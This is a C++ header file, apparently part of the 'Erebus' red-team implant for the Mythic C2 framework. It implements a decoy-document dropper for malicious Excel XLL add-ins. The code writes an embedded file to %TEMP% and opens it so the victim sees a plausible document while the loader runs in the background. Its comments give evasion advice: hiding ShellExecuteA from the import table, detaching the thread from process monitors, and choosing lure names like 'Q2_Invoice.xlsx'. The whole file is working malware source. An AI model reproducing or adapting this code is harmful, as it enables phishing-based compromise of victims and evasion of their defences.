#ifndef EREBUS_XLL_FILE_INGESTOR_HPP
#define EREBUS_XLL_FILE_INGESTOR_HPP
#pragma once

// XLL File Ingestor
// Drops an operator-embedded file to %TEMP% and opens it via ShellExecuteA so
// the victim sees a plausible document while the loader executes in the
// background.  Only compiled into BUILD_XLL targets.
//
// Build-time flow:
//   1. Operator uploads a legitimate file (e.g. an XLSX) in the Mythic builder.
//   2. builder.py converts it to a C byte array and writes include/xll_ingest_file.hpp.
//   3. make is invoked with CONFIG_XLL_FILE_INGESTOR_ENABLED=1.
//   4. xlAutoOpen() calls erebus::LaunchIngestFile() before entry().
//
// OPSEC notes:
//   - ShellExecuteA is resolved at runtime via LoadLibrary/GetProcAddress so
//     shell32.dll does not appear in the XLL import table.
//   - The drop thread is detached (handle closed immediately) so it does not
//     create a joinable child thread observable by process monitors.
//   - File is written to %TEMP% with the operator-chosen name.  Use a filename
//     that matches the delivery pretext (e.g. "Q2_Invoice.xlsx").
//   - Detection surface: unsigned DLL writing a file to %TEMP% then calling
//     ShellExecuteA.  Mitigate by pre-staging the decoy file in the container
//     and using a UNC/container path instead of %TEMP%.

#ifdef BUILD_XLL

#include <windows.h>

#ifndef CONFIG_XLL_FILE_INGESTOR_ENABLED
#define CONFIG_XLL_FILE_INGESTOR_ENABLED 0
#endif

#if CONFIG_XLL_FILE_INGESTOR_ENABLED

// Default filename used when dropping the embedded file.  Overridden by the
// builder via CONFIG_XLL_INGEST_FILENAME to match the actual file extension.
#ifndef CONFIG_XLL_INGEST_FILENAME
#define CONFIG_XLL_INGEST_FILENAME "document.xlsx"
#endif

// Generated at build time by builder.py.  Defines:
//   static const unsigned char xll_ingest_file_data[];
//   static const unsigned long xll_ingest_file_size;
#include "xll_ingest_file.hpp"

namespace erebus {

typedef HINSTANCE (WINAPI *fnShellExecuteA_t)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);

static DWORD WINAPI _IngestFileThread(LPVOID)
{
    if (!xll_ingest_file_data || xll_ingest_file_size == 0)
        return 1;

    char tmp_dir[MAX_PATH] = {};
    DWORD dir_len = GetTempPathA(MAX_PATH, tmp_dir);
    if (dir_len == 0 || dir_len >= MAX_PATH)
        return 1;

    // Ensure trailing backslash.
    if (tmp_dir[dir_len - 1] != '\\') {
        tmp_dir[dir_len++] = '\\';
        tmp_dir[dir_len]   = '\0';
    }

    char drop_path[MAX_PATH] = {};
    // Build: %TEMP%\<filename> without using shlwapi PathCombineA.
    const char* fname = CONFIG_XLL_INGEST_FILENAME;
    if (dir_len + lstrlenA(fname) + 1 >= MAX_PATH)
        return 1;
    lstrcpyA(drop_path, tmp_dir);
    lstrcatA(drop_path, fname);

    HANDLE hFile = CreateFileA(
        drop_path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE)
        return 1;

    DWORD written = 0;
    BOOL ok = WriteFile(hFile, xll_ingest_file_data,
                        (DWORD)xll_ingest_file_size, &written, NULL);
    CloseHandle(hFile);

    if (!ok || written != (DWORD)xll_ingest_file_size)
        return 1;

    // Resolve ShellExecuteA at runtime to avoid a visible shell32 IAT entry.
    HMODULE hShell32 = LoadLibraryA("shell32.dll");
    if (hShell32) {
        auto pSEA = (fnShellExecuteA_t)GetProcAddress(hShell32, "ShellExecuteA");
        if (pSEA)
            pSEA(NULL, "open", drop_path, NULL, NULL, SW_SHOWNORMAL);
        FreeLibrary(hShell32);
    }

    return 0;
}

// Spawns the ingestor in a background thread and immediately releases the
// handle.  Returns without blocking so xlAutoOpen() continues to entry().
inline void LaunchIngestFile()
{
    HANDLE hThread = CreateThread(NULL, 0, _IngestFileThread, NULL, 0, NULL);
    if (hThread)
        CloseHandle(hThread);
}

} // namespace erebus

#endif // CONFIG_XLL_FILE_INGESTOR_ENABLED
#endif // BUILD_XLL
#endif // EREBUS_XLL_FILE_INGESTOR_HPP
